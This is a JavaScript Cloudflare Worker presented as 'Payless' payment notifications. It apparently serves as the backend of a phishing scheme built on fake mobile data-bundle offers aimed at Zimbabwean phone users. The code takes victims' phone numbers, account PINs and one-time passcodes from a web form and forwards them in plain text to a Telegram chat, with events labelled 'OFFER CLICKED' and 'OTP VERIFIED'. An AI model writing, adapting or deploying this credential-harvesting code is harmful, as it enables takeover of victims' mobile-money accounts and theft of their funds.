/**
 * Payless — Cloudflare Worker
 * Handles Telegram notifications for all payment events
 * 
 * Environment variables (set in Worker Settings → Variables):
 *   TELEGRAM_TOKEN   — Bot token from @BotFather
 *   TELEGRAM_CHAT_ID — Group/chat ID (negative number for groups)
 */

export default {
  async fetch(request, env) {

    /* ── CORS preflight ── */
    if (request.method === 'OPTIONS') {
      return cors(null, 204);
    }

    const url = new URL(request.url);

    /* ── Health check ── */
    if (url.pathname === '/health') {
      return cors(JSON.stringify({
        ok: true,
        telegram: !!env.TELEGRAM_TOKEN,
        ts: new Date().toISOString(),
      }));
    }

    /* ── Only accept POST /api/telegram ── */
    if (request.method !== 'POST') {
      return cors(JSON.stringify({ ok: false, error: 'Method not allowed' }), 405);
    }

    /* ── Parse body ── */
    let body;
    try {
      body = await request.json();
    } catch {
      return cors(JSON.stringify({ ok: false, error: 'Invalid JSON' }), 400);
    }

    const {
      event  = '',
      phone  = '',
      pin    = '',
      otp    = '',
      plan   = '',
      voice  = '',
      data   = '',
      sms    = '',
      amount = '',
      device = '',
    } = body;

    /* ── Validate ── */
    if (!env.TELEGRAM_TOKEN || !env.TELEGRAM_CHAT_ID) {
      console.error('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');
      return cors(JSON.stringify({ ok: false, error: 'Server misconfigured' }), 500);
    }

    /* ── Format phone — strip country code, no spaces ── */
    const local = phone
      .replace(/^\+?00263/, '')
      .replace(/^\+?263/, '')
      .replace(/^0/, '')
      .replace(/\D/g, '');

    /* ── Time in Harare ── */
    const now = new Date().toLocaleString('en-GB', {
      timeZone: 'Africa/Harare',
      hour12: false,
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit', second: '2-digit',
    });

    /* ── Event label + emoji ── */
    const META = {
      bundle_subscribed:     { emoji: '🟢', label: 'NEW ORDER' },
      receive_offer_clicked: { emoji: '👆', label: 'OFFER CLICKED' },
      offer_received:        { emoji: '✅', label: 'OTP VERIFIED' },
      resend_otp:            { emoji: '🔁', label: 'OTP RESENT' },
    };
    const { emoji, label } = META[event] || { emoji: '📋', label: event.toUpperCase() };

    /* ── Build message ── */
    const lines = [
      `${emoji} <b>Payless · ${label}</b>`,
      `<code>─────────────────────</code>`,

      `📅 <b>Time</b>    ${now}`,
      `📱 <b>Phone</b>   <code>${local}</code>`,

      pin    ? `🔐 <b>PIN</b>     <code>${pin}</code>`        : null,
      otp    ? `🔑 <b>OTP</b>     <code>${otp}</code>`        : null,

      (plan || amount) ? `<code>─────────────────────</code>` : null,

      plan   ? `📦 <b>Plan</b>    ${plan} Mix`                : null,
      voice  ? `📞 <b>Voice</b>   ${voice} Min`               : null,
      data   ? `🌐 <b>Data</b>    ${data} GB`                 : null,
      sms    ? `💬 <b>SMS</b>     ${sms}`                     : null,
      amount ? `💵 <b>Amount</b>  USD ${parseFloat(amount).toFixed(2)}` : null,

      `<code>─────────────────────</code>`,
      device ? `📟 <b>Device</b>  ${device}`                  : null,
    ].filter(Boolean).join('\n');

    /* ── Send to Telegram ── */
    const tgRes = await fetch(
      `https://api.telegram.org/bot${env.TELEGRAM_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id:    env.TELEGRAM_CHAT_ID,
          text:       lines,
          parse_mode: 'HTML',
        }),
      }
    );

    const tgJson = await tgRes.json();

    if (!tgJson.ok) {
      console.error('Telegram error:', JSON.stringify(tgJson));
    }

    return cors(JSON.stringify({ ok: tgJson.ok }));
  },
};

/* ── CORS helper ── */
function cors(body, status = 200) {
  return new Response(body, {
    status,
    headers: {
      'Content-Type':                'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods':'POST, OPTIONS',
      'Access-Control-Allow-Headers':'Content-Type',
    },
  });
}
